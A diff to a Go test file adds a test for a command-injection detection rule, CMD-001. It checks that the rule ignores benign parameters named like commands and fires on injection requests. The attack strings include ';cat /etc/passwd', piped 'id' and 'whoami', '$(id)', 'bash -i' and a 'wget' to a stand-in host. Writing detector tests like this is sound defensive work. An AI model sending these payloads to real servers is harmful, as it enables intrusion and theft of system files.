@@ -199,3 +199,39 @@ func TestHeaderFieldsOfMalformedRequest(t *testing.T) {
 		t.Fatalf("body field %q", got)
 	}
 }
+
+// CMD-001 must not fire on parameters that share a name with a command.
+func TestCommandInjectionParameters(t *testing.T) {
+	if err := loadRules(""); err != nil {
+		t.Fatal(err)
+	}
+	fires := func(request string) bool {
+		for _, alert := range detect(Transaction{Request: []byte(request)}) {
+			if alert.Rule == "CMD-001" {
+				return true
+			}
+		}
+		return false
+	}
+	get := func(target string) string { return "GET " + target + " HTTP/1.1\r\nHost: test\r\n\r\n" }
+	post := func(body string) string {
+		return fmt.Sprintf("POST /f HTTP/1.1\r\nHost: test\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n%s", len(body), body)
+	}
+	for _, benign := range []string{
+		get("/search?q=%E6%89%8B%E6%9C%BA&cat=3"), get("/orders?page=2&id=42"), get("/a?x=1&sh=0&curl=no"),
+		get("/a?cat"), post("user=a&id=7&cat=books"), get("/a?q=shipping&shell=1"),
+	} {
+		if fires(benign) {
+			t.Errorf("false positive on %q", benign)
+		}
+	}
+	for _, attack := range []string{
+		get("/cgi-bin/;cat%20/etc/passwd"), get("/ping?host=127.0.0.1|id"), get("/ping?host=1;id"),
+		get("/a?x=1%26%26whoami"), get("/a?x=1;wget${IFS}http://e.test"), get("/a?x=$(id)"), get("/a?x=`id`"),
+		post("cmd=whoami%3Bid&token=YWRtaW4="), post("host=1|bash -i"),
+	} {
+		if !fires(attack) {
+			t.Errorf("missed %q", attack)
+		}
+	}
+}
